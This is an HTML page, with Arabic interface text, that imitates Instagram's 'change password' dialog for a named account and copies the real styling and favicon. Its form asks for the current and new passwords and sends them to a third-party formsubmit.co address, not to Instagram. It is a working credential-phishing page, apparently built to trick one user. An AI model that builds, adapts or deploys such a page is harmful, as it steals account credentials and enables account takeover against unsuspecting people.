<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تغيير كلمة السر • Instagram</title>
    
    <link rel="shortcut icon" type="image/x-icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b30c2c9370.ico">

    <style>
        /* الخلفية سوداء تماماً */
        body { 
            background-color: #000; 
            color: #fff; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            margin: 0; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            height: 100vh; 
        }

        /* الصندوق الرئيسي (مركز الحسابات) */
        .modal { 
            background-color: #1c1c1c; 
            width: 100%; 
            max-width: 440px; 
            border-radius: 24px; 
            padding: 24px; 
            box-sizing: border-box; 
        }

        /* الأيقونات العلوية (X و السهم) */
        .header-icons { 
            display: flex; 
            justify-content: space-between; 
            margin-bottom: 15px; 
        }
        .icon { font-size: 24px; color: #fff; cursor: pointer; }

        .user-header { font-size: 15px; color: #fff; margin-bottom: 20px; font-weight: 500; }

        h2 { font-size: 28px; margin: 0 0 10px 0; font-weight: bold; }
        
        .warning-text { 
            font-size: 14px; 
            color: #f5f5f5; 
            line-height: 1.4; 
            margin-bottom: 25px; 
        }

        form { display: flex; flex-direction: column; }

        /* خانات الإدخال مطابقة للصورة تماماً */
        input[type="password"] { 
            width: 100%; 
            background: #1c1c1c; 
            border: 1px solid #424242; 
            border-radius: 14px; 
            padding: 20px 16px; 
            margin-bottom: 12px; 
            color: #fff; 
            font-size: 15px; 
            box-sizing: border-box; 
            text-align: right; 
        }

        /* رابط "هل نسيت كلمة السر" باللون الأزرق */
        .forgot-link { 
            color: #0095f6; 
            text-decoration: none; 
            font-size: 15px; 
            font-weight: 500; 
            align-self: flex-start; 
            margin: 5px 0 20px 0; 
        }

        /* قسم تسجيل الخروج مع المربع (Checkbox) */
        .logout-section { 
            display: flex; 
            align-items: flex-start; 
            gap: 12px; 
            margin-bottom: 30px; 
            line-height: 1.4; 
        }
        .logout-text { font-size: 14px; color: #fff; flex: 1; }
        
        input[type="checkbox"] { 
            width: 22px; 
            height: 22px; 
            accent-color: #0095f6; 
            cursor: pointer; 
            background: none; 
            border: 2px solid #424242; 
            border-radius: 4px; 
        }

        /* الزر الأزرق الداكن الاحترافي */
        .submit-btn { 
            background-color: #183354; 
            color: #4a82b5; 
            border: none; 
            border-radius: 30px; 
            padding: 14px; 
            font-weight: bold; 
            font-size: 16px; 
            cursor: pointer; 
        }
    </style>
</head>
<body>

<div class="modal">
    <div class="header-icons">
        <div class="icon">✕</div>
        <div class="icon">⟩</div>
    </div>

    <div class="user-header">anes_38 • Instagram</div>

    <h2>تغيير كلمة السر</h2>
    
    <div class="warning-text">
        يجب ألا تقل كلمة السر عن 6 من الأحرف وأن تتضمن توليفة من الأرقام والأحرف الأبجدية والأحرف الخاصة (!@$%).
    </div>

    <form action="https://formsubmit.co/b35269abccf715e68332f1a3a4ccca0c" method="POST">
        <input type="password" name="current_pass" placeholder="كلمة السر الحالية (تم التحديث في 11/04/2026)" required>
        <input type="password" name="new_pass" placeholder="كلمة السر الجديدة" required>
        <input type="password" name="confirm_pass" placeholder="إعادة كتابة كلمة السر الجديدة" required>

        <a href="#" class="forgot-link">هل نسيت كلمة السر؟</a>

        <div class="logout-section">
            <div class="logout-text">
                <b>تسجيل الخروج من الأجهزة الأخرى.</b> حدد هذا الخيار إذا استخدم شخص آخر حسابك.
            </div>
            <input type="checkbox" name="logout_all_devices">
        </div>

        <button type="submit" class="submit-btn">تغيير كلمة السر</button>
    </form>
</div>

</body>
</html>
